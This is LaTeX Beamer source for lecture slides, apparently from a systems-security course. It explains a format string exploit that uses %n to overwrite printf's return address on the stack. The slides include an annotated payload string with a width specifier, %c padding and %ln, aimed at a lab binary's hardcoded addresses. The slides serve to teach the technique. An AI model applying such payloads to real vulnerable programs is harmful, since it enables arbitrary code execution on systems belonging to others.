\usetikzlibrary{matrix}
\begin{frame}{format string exploit}
    \begin{itemize}
    \item can use \texttt{\%n} to write \textbf{arbitrary values to arbitrary memory addresses}
    \item later: we'll talk about a bunch of ways of use this to execute code
    \item for now: overwrite return address from printf
    \vspace{.5cm}
    \item using debugger: I determine printf's return address is on stack at \texttt{0x7fffffffecf8}
    \item want to write address of exploited \texttt{0x401156}
    \end{itemize}
\end{frame}

\begin{frame}[fragile,label=exploitPatternSimple]{stack layout}
\begin{tikzpicture}
\matrix[tight matrix,nodes={style={text width=7cm,minimum height=.6cm}}] {
    printf return address \\
    printf argument 7/buffer start \& byte 0-7 of buffer \\
    printf argument 8 \& byte 8-15 of buffer \\
    printf argument 9 \& byte 16-23 of buffer \\
    printf argument 10 \& byte 24-31 of buffer \\
    printf argument 11 \& byte 32-39 of buffer \\
    \ldots \& \ldots \\
};
\end{tikzpicture}
\begin{itemize}
\item<2-> strategy: fit format string within bytes 0-31 of buffer
\item<2-> \ldots and use bytes 32-39 to hold pointer to return address
\item<2-> \ldots and have first 9 items in format string write \texttt{0x401156} bytes
\item<2-> \ldots and use \%n as 10th item (pointer to overwrite target)
\vspace{.5cm}
\item<3-> (if that's not enough space: use a later argument)
\end{itemize}
\end{frame}

\begin{frame}[fragile,label=formatExploit]{exploit}
\begin{tikzpicture}
\matrix[tight matrix,nodes={style={text width=7cm,minimum height=.6cm,font=\small}}] (stack) {
    printf return address \\
    \myemph<4>{printf argument 7}/buffer start \& \tt "\myemph<2>{\%.419873}" \\
    \myemph<4>{printf argument 8} \& \tt "\myemph<2>{4u}\myemph<3>{\%c\%c\%c}" \\
    \myemph<4>{printf argument 9} \& \tt "\myemph<3>{\%c}\myemph<4>{\%c\%c\%c}" \\
    \myemph<4>{printf argument 10} \& \tt "\myemph<4>{\%c}\myemph<5>{\%ln}\myemph<6>{...}" \\
    \myemph<5>{printf argument 11} \& target \tt 0x7fffffffecf8 \\
    \ldots \& \ldots \\
};
\tikzset{
    note/.style={draw=red,very thick,anchor=north,align=left,at={([yshift=-.5cm]stack.south)}},
}
\begin{visibleenv}<2>
\node[note] {
    write unsigned number with 4198734 digits of percision \\
    result: \%rsi (printf arg 2) output \\
    padded to 4198734 digits with zeroes
};
\end{visibleenv}
\begin{visibleenv}<3>
\node[note] {
    one char (byte) based on printf args 3, 4, 5, 6 \\
    (\%rdx, \%rcx, \%r8, \%r9) \\
};
\end{visibleenv}
\begin{visibleenv}<4>
\node[note] {
    one char (byte) based on printf args 7, 8, 9, 10 \\
    (stack locations)
};
\end{visibleenv}
\begin{visibleenv}<5>
\node[note] {
    store number of bytes printed into printf arg 11 \\
    \texttt{l} indicates that it a long (not int) \\
    total bytes = 4198734 (\%u) + 8 (\%c $\times$ 8) = 0x401156
};
\end{visibleenv}
\begin{visibleenv}<6>
\node[note] {
    extra data just to ensure the target address \\
    is positioned correctly
};
\end{visibleenv}
\end{tikzpicture}
\end{frame}
